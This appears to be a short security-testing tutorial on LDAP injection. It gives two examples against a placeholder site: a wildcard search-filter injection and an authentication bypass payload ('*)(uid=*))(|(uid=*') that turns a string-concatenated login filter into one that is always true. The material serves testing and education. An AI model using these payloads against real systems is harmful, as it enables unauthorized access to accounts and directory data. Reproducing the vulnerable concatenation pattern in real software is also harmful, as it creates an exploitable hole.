# LDAP Injection
---
Lightweight Directory Access Protocol (LDAP) is used to store information about users, hosts, and many other objects.
A web application could use LDAP in order to let users authenticate or search other users’ information inside a corporate structure.
***A successful exploitation*** of an LDAP injection vulnerability could allow the tester to:

-   Access unauthorized content
-   Evade application restrictions
-   Gather unauthorized informations
-   Add or modify Objects inside LDAP tree structure.

## Example 1: Search Filters
Let’s suppose we have a web application using a search filter like the following one:
```txt
searchfilter="(cn="+user+")"
```

which is instantiated by an HTTP request like this:
```txt
http://www.example.com/ldapsearch?user=John
```

If the value `John` is replaced with a `*`, by sending the request:
```txt
http://www.example.com/ldapsearch?user=*
```

The filter will look like:
```txt
searchfilter="(cn=*)"
```
 >Note : A tester could use a trial-and-error approach, by inserting in the parameter `(`, `|`, `&`, `*` and the other characters, in order to check the application for errors.

## Example 2: Login
Let’s suppose a web application uses a filter to match LDAP user/password pair.
```txt
searchlogin= "(&(uid="+user+")(userPassword={MD5}"+base64(pack("H*",md5(pass)))+"))";
```

By using the following values:
```txt
user=*)(uid=*))(|(uid=*
pass=password
```
the search filter will results in:

```txt
searchlogin="(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))";
```
which is correct and always true.